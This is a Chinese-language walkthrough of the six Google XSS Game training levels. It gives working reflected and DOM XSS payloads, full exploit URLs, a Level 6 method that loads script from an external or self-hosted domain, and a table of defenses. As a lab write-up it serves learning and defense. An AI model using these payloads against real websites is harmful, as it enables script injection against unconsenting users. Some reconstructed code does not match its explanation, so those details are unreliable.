# Google XSS Game 靶场通关笔记

## 安全与法律提示

Google XSS Game 是 Google 官方提供的**授权教学靶场**。本文所有 Payload 仅可用于该靶场，以及你拥有**明确书面授权**的测试系统。未经授权对真实网站进行 XSS 测试属于违法行为，可能承担刑事责任。请务必遵守《网络安全法》等相关法律法规。

建议你每关先自己尝试，卡住后再参考本文。理解“为什么这样构造”比记住 Payload 更重要。

靶场网址：<https://xss-game.appspot.com/>

***

## Level 1 — Hello, World of XSS

### 漏洞类型

反射型 XSS（服务端将用户输入直接输出到 HTML 中）。

### 原理

页面接收 URL 查询参数 `query`，并将其值直接拼接到 HTML 里返回给浏览器。浏览器把用户输入当作 HTML 代码解析，而不是纯文本。

### 侦察过程

1. 访问 `https://xss-game.appspot.com/level1/frame`。
2. 在搜索框输入 `hello`，提交后观察 URL 变为 `?query=hello`，页面显示类似 “Sorry, no results for hello”。

![1789801951400-e08d0d0c-0684-45b6-8935-aa2729fafe10.png](./img/285733123/1789801951400-e08d0d0c-0684-45b6-8935-aa2729fafe10-742395.png)

3. 输入 `<h1>test</h1>`，发现页面渲染出大标题，说明 HTML 被解析。

![1789801972351-0210a2a7-081f-4c26-8a92-f38a3bb9d909.png](./img/285733123/1789801972351-0210a2a7-081f-4c26-8a92-f38a3bb9d909-128751.png)

4. 输入 `<script>alert(1)</script>`，弹窗出现。

![1789802047081-f007e777-425f-4669-8093-e1a24be43150.png](./img/285733123/1789802047081-f007e777-425f-4669-8093-e1a24be43150-406438.png)

### Payload

```html
<script>alert(1)</script>
```

### 操作步骤

在搜索框直接输入上述 Payload 并提交。或者直接访问：

```plain
https://xss-game.appspot.com/level1/frame?query=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

![1789802022627-01e7781d-55b5-4348-b24c-4dd1b6e01161.png](./img/285733123/1789802022627-01e7781d-55b5-4348-b24c-4dd1b6e01161-063946.png)

### 原理解析

服务端代码大致为：

```html
<div>Sorry, no results for <b>{{ query }}</b></div>

```

`{{ query }}` 被替换为你的输入，没有做 HTML 实体编码。浏览器看到 `<script>` 标签后，将其作为 JavaScript 执行。

***

## Level 2 — Persistence is Key

### 漏洞类型

存储型 / DOM 型 XSS（用户输入被保存到客户端存储，再通过 `innerHTML` 渲染）。

### 原理

留言板允许你提交消息，消息被保存在浏览器的客户端存储中（推测为 `localStorage` 或类似机制）。页面重新加载时，消息被读取并通过 `innerHTML` 插入 DOM。代码对 `<script>` 标签做了过滤，但未过滤其他 HTML 标签和事件属性。

### 侦察过程

1. 访问 `https://xss-game.appspot.com/level2/frame`。
2. 在留言框提交 `<script>alert(1)</script>`，发现消息显示为纯文本或标签被移除，没有弹窗。

![1789802126249-c284543d-1ded-4c5e-a145-e05d2b44de50.png](./img/285733123/1789802126249-c284543d-1ded-4c5e-a145-e05d2b44de50-783264.png)

3. 打开开发者工具，查看 Elements 面板，发现消息内容被插入到某个容器中。

![1789802198919-3820e8b7-e2aa-4c3f-bb5c-36c17fe841ca.png](./img/285733123/1789802198919-3820e8b7-e2aa-4c3f-bb5c-36c17fe841ca-113430.png)

4. 推测过滤规则：可能用正则替换了 `<script` 标签（大小写不敏感），但没有处理事件属性。
5. 尝试提交 `<img src=x onerror=alert(1)>`，弹窗出现。

![1789802354487-2e0927d1-8d41-4f9d-abf3-07a0549979de.png](./img/285733123/1789802354487-2e0927d1-8d41-4f9d-abf3-07a0549979de-201050.png)

### Payload

```html
<img src=x onerror=alert(1)>
```

### 操作步骤

在留言框输入上述 Payload，提交后页面重新渲染消息，弹窗触发。刷新页面后，由于消息被存储，弹窗会再次触发。

![1789802256963-a171cdee-6216-4551-bbd9-f309906e6f94.png](./img/285733123/1789802256963-a171cdee-6216-4551-bbd9-f309906e6f94-164970.png)

### 原理解析

`<img>` 标签的 `src` 设为不存在的 `x`，图片加载失败时触发 `onerror` 事件，执行 `alert(1)`。过滤机制只移除了 `<script>` 标签，但没有移除 `onerror` 等事件属性。这体现了**黑名单过滤的局限性**：攻击者总能找到未过滤的标签或属性。

***

## Level 3 — That Sinking Feeling

### 漏洞类型

DOM 型反射 XSS（`location.hash` 被拼接到 HTML 属性中，再通过 jQuery `.html()` 渲染）。

### 原理

页面从 URL 的 fragment（`#` 后面的内容）中读取一个数字，将其拼接到 `<img>` 标签的 `src` 属性中，然后使用 jQuery 的 `.html()` 方法插入 DOM。fragment 中的内容未经过滤，可以闭合属性并注入事件处理器。

### 侦察过程

1. 访问 `https://xss-game.appspot.com/level3/frame#1`，页面显示一张图片。

![1789802479322-b4b5a39e-80d5-4ae3-9f3d-91a2aff56b1b.png](./img/285733123/1789802479322-b4b5a39e-80d5-4ae3-9f3d-91a2aff56b1b-318571.png)

2. 将 `#1` 改为 `#abc`，图片消失或出现异常，说明 hash 值被用于构造图片路径。

![1789802498302-1080139c-a3a5-4dad-8518-a3d1524a6101.png](./img/285733123/1789802498302-1080139c-a3a5-4dad-8518-a3d1524a6101-431828.png)

3. 查看源码（或开发者工具），找到类似逻辑：

```javascript
var hash = location.hash;
if (hash) {
  var img = '<img src="/static/level3/cloud' + hash + '.jpg">';
  $('#image').html(img);
}
```

4. 尝试输入 `#1' onerror='alert(1)`，弹窗出现。

![1789802971995-6c35131d-36a1-47f6-9094-39ae9393ac17.png](./img/285733123/1789802971995-6c35131d-36a1-47f6-9094-39ae9393ac17-344164.png)

### Payload

```html
#1' onerror='alert(1)
```

### 操作步骤

访问以下完整 URL：

```plain
https://xss-game.appspot.com/level3/frame#1'%20onerror='alert(1)
```

注意：`#` 后的空格需要编码为 `%20`，单引号可以保留。

![1789802956270-10d3c6d2-d0ae-4f25-91fb-48bfd7665536.png](./img/285733123/1789802956270-10d3c6d2-d0ae-4f25-91fb-48bfd7665536-000052.png)

### 原理解析

原始代码拼接出的 HTML 为：

```html
<img src="/static/level3/cloud1' onerror='alert(1).jpg">
```

Payload 中的单引号闭合了 `src` 属性的单引号，然后插入 `onerror='alert(1)`。末尾的 `.jpg` 会成为 `onerror` 属性值的一部分，但 `alert(1)` 已经执行，后面的 `.jpg` 只会导致 JavaScript 报错，不影响弹窗。

***

## Level 4 — Context Matters

### 漏洞类型

DOM 型反射 XSS（用户输入被拼接到 JavaScript 字符串上下文中，通过闭合引号逃逸）。

### 原理

页面从 URL 查询参数 `timer` 中读取值，并将其拼接到一段 JavaScript 代码的字符串字面量中。服务端对输入做了一定转义（推测），但输入被放入 JavaScript 字符串，仍然可以用引号闭合逃逸。

### 侦察过程

1. 访问 `https://xss-game.appspot.com/level4/frame?timer=1`，页面显示倒计时。
2. 输入 `timer=abc`，页面出现 JavaScript 错误或倒计时异常。

![1789803054285-1d506ecf-3849-4771-b6fa-41df23d645a6.png](./img/285733123/1789803054285-1d506ecf-3849-4771-b6fa-41df23d645a6-620853.png)

3. 查看源码，发现类似：

```html
<script>
  function startTimer(seconds) {
    // ...
  }
  startTimer('{{ timer }}');
</script>

```

4. 尝试输入 `1');alert(1);//`，弹窗出现。

![1789803243718-531c082e-7cf3-4fcc-bc52-5fcbec40dbf4.png](./img/285733123/1789803243718-531c082e-7cf3-4fcc-bc52-5fcbec40dbf4-869411.png)

### Payload

```javascript
1');alert(1);//
```

### 操作步骤

访问以下完整 URL：

```plain
https://xss-game.appspot.com/level4/frame?timer=1%27%29%3Balert%281%29%3B%2F%2F
```

![1789803234397-ad7020bf-ca3a-4a8e-a6cb-d4cedbfdb36d.png](./img/285733123/1789803234397-ad7020bf-ca3a-4a8e-a6cb-d4cedbfdb36d-346808.png)

### 原理解析

服务端将 `timer` 的值插入到 `startTimer('...')` 中。原始代码为：

```javascript
startTimer('1');
```

Payload `1');alert(1);//` 使代码变成：

```javascript
startTimer('1');alert(1);//');
```

* `'` 闭合了字符串。
* `)` 闭合了 `startTimer` 函数调用。
* `;` 结束语句。
* `alert(1);` 执行弹窗。
* `//` 注释掉后面的内容。

此关的核心是**上下文决定 Payload**：在 HTML 上下文中有效的 `<script>` 在这里无效，必须针对 JavaScript 字符串上下文构造。

***

## Level 5 — Breaking Protocol

### 漏洞类型

DOM 型反射 XSS（`javascript:` URI 注入到 `href` 属性）。

### 原理

页面从 URL 查询参数 `next` 中读取值，并将其作为“下一页”链接的 `href`。代码过滤了 `<script>` 标签和 `on` 事件属性（推测），但没有校验 URL 的协议，导致 `javascript:` URI 可以执行。

### 侦察过程

1. 访问 `https://xss-game.appspot.com/level5/frame/signup?next=confirm`，页面显示一个“Next”按钮。

![1789803395416-f19ac0f6-ae6b-418c-b996-5dea3a886813.png](./img/285733123/1789803395416-f19ac0f6-ae6b-418c-b996-5dea3a886813-739173.png)

2. 点击按钮，跳转到 `confirm` 页面。

![1789803418428-9576d580-7cb9-46b6-bdb4-668772e5aca4.png](./img/285733123/1789803418428-9576d580-7cb9-46b6-bdb4-668772e5aca4-587991.png)

3. 查看源码，发现类似：

```html
<a href="{{ next }}">Next</a>

```

![1789803567215-5ad8f187-1384-48b9-aff2-b38b9770ce9c.png](./img/285733123/1789803567215-5ad8f187-1384-48b9-aff2-b38b9770ce9c-464383.png)

4. 尝试 `next=<script>alert(1)</script>`，发现被过滤。

![1789813872494-c8c8a523-05d1-4aa7-9fc7-05c5af53dd44.png](./img/285733123/1789813872494-c8c8a523-05d1-4aa7-9fc7-05c5af53dd44-839686.png)

5. 尝试 `next=javascript:alert(1)`，点击按钮后弹窗。

![1789813772732-40572e7c-18b1-4bdb-9b43-ca4f2715ee54.png](./img/285733123/1789813772732-40572e7c-18b1-4bdb-9b43-ca4f2715ee54-109921.png)

### Payload

```plain
javascript:alert(1)
```

### 操作步骤

访问以下完整 URL：

```plain
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
```

页面加载后，点击“Next”按钮，弹窗触发。

![1789813905848-bf04695e-6f51-41aa-99cb-2ad120a25929.png](./img/285733123/1789813905848-bf04695e-6f51-41aa-99cb-2ad120a25929-245855.png)

![1789814090334-e6bfe2a3-d91b-4c2a-ab20-6ee1afe1f0bb.png](./img/285733123/1789814090334-e6bfe2a3-d91b-4c2a-ab20-6ee1afe1f0bb-337903.png)

### 原理解析

`javascript:` 是一种 URI 协议，当用户点击链接时，浏览器会执行其后的 JavaScript 代码。过滤机制只针对标签和事件属性，没有对 `href` 的协议做白名单校验。防御时应只允许 `http`、`https` 或相对路径。

***

## Level 6 — Follow the Rabbit

### 漏洞类型

DOM 型反射 XSS（动态脚本加载，URL 校验不严谨）。

### 原理

页面从 URL 的 fragment 中读取一个 URL，动态创建一个 `<script>` 标签，并将其 `src` 设为该 URL。代码尝试限制 URL 必须以 `https://` 开头，但校验逻辑存在缺陷（推测）。

### 侦察过程

1. 访问 `https://xss-game.appspot.com/level6/frame`。

![1789814252124-2d82fc16-2c7b-4316-a5bc-5a0b54a19f1c.png](./img/285733123/1789814252124-2d82fc16-2c7b-4316-a5bc-5a0b54a19f1c-966284.png)

2. 在输入框输入 `https://example.com/alert.js`，页面提示只允许 `https://` 开头的 URL。
3. 查看源码，发现类似：

```javascript
var url = location.hash.slice(1);
if (url) {
  if (!/^https?:\/\//.test(url)) {
    url = 'https://' + url;
  }
  var script = document.createElement('script');
  script.src = url;
  document.body.appendChild(script);
}
```

4. 推测：正则 `/^https?:\/\//` 只匹配小写协议，且如果 URL 不符合，会自动添加 `https://` 前缀。

### Payload

**协议相对路径（推荐）**

```plain
#//www.google.com/jsapi?callback=alert
```

**data URI**

```plain
#data:text/javascript,alert(1)
#data:text/javascript,alert('XSS')
#data:application/javascript,alert(1)
```

**大小写绕过**

```plain
#Https://你的js地址
#hTTP://你的js地址
#Https://www.google.com/jsapi?callback=alert
```

**自己托管 JS（协议相对）**

```plain
#//你的域名/alert.js
```

**完整推荐地址**：

```plain
https://xss-game.appspot.com/level6/frame#//www.google.com/jsapi?callback=alert
```

### 操作步骤

1. 访问：

```plain
https://xss-game.appspot.com/level6/frame#//www.google.com/jsapi?callback=alert
```

![1789814644843-b7ea1273-3914-4e81-b9d3-9912259e4395.png](./img/285733123/1789814644843-b7ea1273-3914-4e81-b9d3-9912259e4395-326586.png)

2. 页面会加载并执行你的脚本，弹窗出现。

![1789814628732-fdf015ed-9577-4f5e-bdaa-25aab39bc694.png](./img/285733123/1789814628732-fdf015ed-9577-4f5e-bdaa-25aab39bc694-422274.png)

### 原理解析

代码将 fragment 中的 URL 作为动态 `<script>` 的 `src`。由于校验允许 `https://` 开头的 URL，你可以加载任意外部 HTTPS 脚本。此关体现了**动态脚本加载**的风险：永远不要将用户可控的 URL 直接用作脚本源。

> **补充说明**：如果你不想搭建服务器，可以尝试 `#data:text/javascript,alert(1)`，但根据源码分析，代码可能会为其添加 `https://` 前缀而导致失效（推测）。在实际靶场中，使用外部 HTTPS 脚本是最可靠的方法。

## 关卡总结

| 关卡 | 漏洞类型 | 注入点 | 核心绕过技巧 | 关键 Payload |
| --- | --- | --- | --- | --- |
| Level 1 | 反射型 XSS | `query` 参数 | 无过滤，直接注入 | `<script>alert(1)</script>` |
| Level 2 | 存储型 / DOM 型 | 留言框 | 用 `<img onerror>` 替代 `<script>` | `<img src=x onerror=alert(1)>` |
| Level 3 | DOM 型 | `location.hash` | 闭合属性，添加 `onerror` | `#1' onerror='alert(1)` |
| Level 4 | DOM 型 | `timer` 参数 | 逃逸 JavaScript 字符串上下文 | `1');alert(1);//` |
| Level 5 | DOM 型 | `next` 参数 | 注入 `javascript:` 协议 | `javascript:alert(1)` |
| Level 6 | DOM 型 | `location.hash` | 动态脚本加载 + URL 校验缺陷 | `#https://your-server.com/alert.js` |

## 防御思路速查

| 关卡 | 根本问题 | 防御要点 |
| --- | --- | --- |
| L1 | 输出到 HTML 上下文时未编码 | 对用户输入做 HTML 实体编码 |
| L2 | `innerHTML` + 黑名单过滤 | 使用 `textContent`；避免黑名单，改用白名单或编码 |
| L3 | 用户输入拼接到 HTML 属性中 | 对属性值做引号转义；避免 `.html()` 拼接 |
| L4 | 用户输入拼接到 JS 字符串中 | 使用 `JSON.stringify()` 安全嵌入；避免字符串拼接 |
| L5 | 用户输入作为 `href` 未校验协议 | 校验协议白名单（仅允许 `http`/`https`/相对路径） |
| L6 | 动态脚本加载 + 正则缺陷 | 对动态脚本的 `src` 做严格协议校验；避免加载用户可控 URL |

***


